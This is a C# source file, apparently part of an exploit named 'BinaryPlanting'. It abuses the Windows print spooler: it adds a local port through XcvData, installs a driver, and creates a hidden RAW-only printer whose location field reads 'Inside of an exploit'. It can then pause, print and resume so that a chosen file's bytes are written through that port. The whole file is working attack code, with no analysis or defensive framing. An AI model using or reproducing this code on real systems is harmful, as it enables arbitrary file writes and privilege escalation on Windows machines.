using System;
using System.IO;
using System.Runtime.InteropServices;

namespace BinaryPlanting
{
    static class Printer
    {

        [StructLayout(LayoutKind.Sequential)]
        public class PRINTER_DEFAULTS
        {
            public string pDatatype;
            public string pDevMode;
            public uint DesiredAccess;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class PRINTER_INFO_2
        {
            public string pServerName;
            public string pPrinterName;
            public string pShareName;
            public string pPortName;
            public string pDriverName;
            public string pComment;
            public string pLocation;
            public IntPtr pDevMode;
            public string pSepFile;
            public string pPrintProcessor;
            public string pDatatype;
            public string pParameters;
            public IntPtr pSecurityDescriptor;
            public uint Attributes;
            public uint Priority;
            public uint DefaultPriority;
            public uint StartTime;
            public uint UntilTime;
            public uint Status;
            public uint cJobs;
            public uint AveragePPM;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class DOC_INFO_1
        {
            public string pDocName;
            public string pOutputFile;
            public string pDatatype;
        }

        private enum PRINTER_CONTROL
        {
            PRINTER_CONTROL_PAUSE = 1,
            PRINTER_CONTROL_RESUME = 2,
            PRINTER_CONTROL_PURGE = 3,
            PRINTER_CONTROL_SET_STATUS = 4
        }

        [DllImport("winspool.drv", EntryPoint = "XcvDataW", SetLastError = true)]
        private static extern bool XcvData(
            IntPtr hXcv,
            [MarshalAs(UnmanagedType.LPWStr)] string pszDataName,
            IntPtr pInputData,
            uint cbInputData,
            IntPtr pOutputData,
            uint cbOutputData,
            out uint pcbOutputNeeded,
            out uint pwdStatus);

        [DllImport("winspool.drv", EntryPoint = "InstallPrinterDriverFromPackage", SetLastError = true)]
        private static extern int InstallPrinterDriverFromPackage(
            string pszServer,
            string pszInfPath,
            string pszDriverName,
            string pszEnvironment,
            uint dwFlags);

        [DllImport("winspool.drv", EntryPoint = "OpenPrinter", SetLastError = true)]
        private static extern int OpenPrinter(
            string pPrinterName,
            out IntPtr hPrinter,
            PRINTER_DEFAULTS pDefault);

        [DllImport("winspool.drv", EntryPoint = "AddPrinter", SetLastError = true)]
        static extern IntPtr AddPrinter(string printerName, uint Level, PRINTER_INFO_2 printerinfo);

        [DllImport("winspool.drv", EntryPoint = "SetPrinter", SetLastError = true)]
        private static extern int SetPrinter(
            IntPtr hPrinter,
            uint Level,
            IntPtr pPrinter,
            PRINTER_CONTROL Command);

        [DllImport("winspool.drv", EntryPoint = "WritePrinter", SetLastError = true)]
        private static extern int WritePrinter(
            IntPtr hPrinter,
            IntPtr pBuf,
            UInt32 cbBuf,
            out UInt32 pcWritten);

        [DllImport("winspool.drv", EntryPoint = "StartDocPrinter", SetLastError = true)]
        private static extern int StartDocPrinter(
            IntPtr hPrinter,
            Int32  Level,
            DOC_INFO_1 pDocInfo
        );

        [DllImport("winspool.drv", EntryPoint = "EndDocPrinter", SetLastError = true)]
        private static extern int EndDocPrinter(
            IntPtr hPrinter);

        [DllImport("winspool.drv", EntryPoint = "StartPagePrinter", SetLastError = true)]
        private static extern int StartPagePrinter(
            IntPtr hPrinter);

        [DllImport("winspool.drv", EntryPoint = "EndPagePrinter", SetLastError = true)]
        private static extern int EndPagePrinter(
            IntPtr hPrinter);

        [DllImport("winspool.drv", EntryPoint = "ClosePrinter", SetLastError = true)]
        private static extern bool ClosePrinter(
            IntPtr hPrinter);

        private const uint SERVER_ACCESS_ADMINISTER = 0x00000001;
        private const uint PRINTER_ALL_ACCESS = 0x000F000C;
        private const uint PRINTER_ACCESS_USE = 0x00000008;

        private const uint PRINTER_ATTRIBUTE_HIDDEN = 0x00000020;
        private const uint PRINTER_ATTRIBUTE_RAW_ONLY = 0x00001000;

        public static bool NewPrinter(string printerName, string portName, string driverName)
        {
            IntPtr hMonitor;
            IntPtr hPrinter;
            bool bRes;
            int iRes;
            uint size, needed, xcvResult;

            PRINTER_DEFAULTS printerDefaults = new PRINTER_DEFAULTS();
            printerDefaults.pDatatype = null;
            printerDefaults.pDevMode = null;
            printerDefaults.DesiredAccess = SERVER_ACCESS_ADMINISTER;

            hMonitor = IntPtr.Zero;
            iRes = OpenPrinter(",XcvMonitor Local Port", out hMonitor, printerDefaults);
            if (iRes == 0)
            {
                Console.WriteLine("[-] Error opening printer handle: {0}\n", Marshal.GetLastWin32Error());
                return false;
            }

            if (!portName.EndsWith("\0")) portName += "\0";
            size = (uint)(portName.Length * 2);
            IntPtr portPtr = Marshal.AllocHGlobal((int)size);
            Marshal.Copy(portName.ToCharArray(), 0, portPtr, portName.Length);

            bRes = XcvData(hMonitor, "AddPort", portPtr, size, IntPtr.Zero, 0, out needed, out xcvResult);
            if (bRes == false)
            {
                Console.WriteLine("[-] Failed to add port: {0}\n", Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(portPtr);
                ClosePrinter(hMonitor);
                return false;
            }

            iRes = InstallPrinterDriverFromPackage(null, null, driverName, null, 0);
            if (iRes != 0)
            {
                Console.WriteLine("[-] Failed to install print driver: {0}\n", Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(portPtr);
                ClosePrinter(hMonitor);
                return false;
            }

            PRINTER_INFO_2 printerinfo2 = new PRINTER_INFO_2();
            printerinfo2.pPortName = portName;
            printerinfo2.pDriverName = driverName;
            printerinfo2.pPrinterName = printerName;
            printerinfo2.pPrintProcessor = "WinPrint";
            printerinfo2.pDatatype = "RAW";
            printerinfo2.pComment = "I'd be careful with this one...";
            printerinfo2.pLocation = "Inside of an exploit";
            printerinfo2.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
            printerinfo2.AveragePPM = 9001;

            hPrinter = IntPtr.Zero;
            hPrinter = AddPrinter(null, 2, printerinfo2);
            if (hPrinter == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create printer: {0}\n", Marshal.GetLastWin32Error());
                Marshal.FreeHGlobal(portPtr);
                ClosePrinter(hMonitor);
                return false;
            }

            Marshal.FreeHGlobal(portPtr);
            ClosePrinter(hMonitor);
            ClosePrinter(hPrinter);

            return true;
        }

        private static bool ChangePrinter(string printerName, PRINTER_CONTROL state)
        {
            IntPtr hPrinter;
            int iRes;

            PRINTER_DEFAULTS printerDefaults = new PRINTER_DEFAULTS();
            printerDefaults.pDatatype = null;
            printerDefaults.pDevMode = null;
            printerDefaults.DesiredAccess = PRINTER_ALL_ACCESS;

            iRes = OpenPrinter(printerName, out hPrinter, printerDefaults);
            if (iRes == 0)
            {
                Console.WriteLine("[-] OpenPrinter failed: {0}", Marshal.GetLastWin32Error());
                return false;
            }

            iRes = SetPrinter(hPrinter, 0, IntPtr.Zero, state);
            if (iRes == 0)
            {
                Console.WriteLine("[-] SetPrinter failed: {0}", Marshal.GetLastWin32Error());
                ClosePrinter(hPrinter);
                return false;
            }

            ClosePrinter(hPrinter);
            return true;
        }

        public static bool ResumePrinter(string printerName)
        {
            return ChangePrinter(printerName, PRINTER_CONTROL.PRINTER_CONTROL_RESUME);
        }

        public static bool PausePrinter(string printerName)
        {
            return ChangePrinter(printerName, PRINTER_CONTROL.PRINTER_CONTROL_PAUSE);
        }

        public static bool PrintDocument(string printerName, string fileName)
        {
            FileStream fileStream = new FileStream(fileName, FileMode.Open);
            BinaryReader binaryReader = new BinaryReader(fileStream);
            Byte[] bytes = new Byte[fileStream.Length];
            IntPtr pUnmanagedBytes = new IntPtr(0);
            Int32 nLength;
            UInt32 nWritten;

            PRINTER_DEFAULTS printerDefaults = new PRINTER_DEFAULTS();
            DOC_INFO_1 docinfo1 = new DOC_INFO_1();
            
            IntPtr hPrinter;
            int iRes;

            nLength = Convert.ToInt32(fileStream.Length);
            bytes = binaryReader.ReadBytes(nLength);
            pUnmanagedBytes = Marshal.AllocCoTaskMem(nLength);
            Marshal.Copy(bytes, 0, pUnmanagedBytes, nLength);

            printerDefaults.pDatatype = null;
            printerDefaults.pDevMode = null;
            printerDefaults.DesiredAccess = PRINTER_ACCESS_USE;

            iRes = OpenPrinter(printerName, out hPrinter, printerDefaults);
            if (iRes == 0)
            {
                Console.WriteLine("[-] OpenPrinter failed: {0}", Marshal.GetLastWin32Error());
                Marshal.FreeCoTaskMem(pUnmanagedBytes);
                return false;
            }

            docinfo1.pDocName = "RAW document";
            docinfo1.pOutputFile = null;
            docinfo1.pDatatype = "RAW";

            iRes = StartDocPrinter(hPrinter, 1, docinfo1);
            if (iRes == 0)
            {
                Console.WriteLine("[-] StartDocPrinter failed: {0}", Marshal.GetLastWin32Error());
                ClosePrinter(hPrinter);
                Marshal.FreeCoTaskMem(pUnmanagedBytes);
                return false;
            }

            iRes = StartPagePrinter(hPrinter);
            if (iRes == 0)
            {
                Console.WriteLine("[-] StartPagePrinter failed: {0}", Marshal.GetLastWin32Error());
                EndDocPrinter(hPrinter);
                ClosePrinter(hPrinter);
                Marshal.FreeCoTaskMem(pUnmanagedBytes);
                return false;
            }

            iRes = WritePrinter(hPrinter, pUnmanagedBytes, (uint) nLength, out nWritten);
            if (iRes == 0)
            {
                Console.WriteLine("[-] WritePrinter failed: {0}", Marshal.GetLastWin32Error());
                EndPagePrinter(hPrinter);
                EndDocPrinter(hPrinter);
                ClosePrinter(hPrinter);
                Marshal.FreeCoTaskMem(pUnmanagedBytes);
                return false;
            }

            EndPagePrinter(hPrinter);
            EndDocPrinter(hPrinter);
            ClosePrinter(hPrinter);
            Marshal.FreeCoTaskMem(pUnmanagedBytes);

            return true;
        }
    }
}
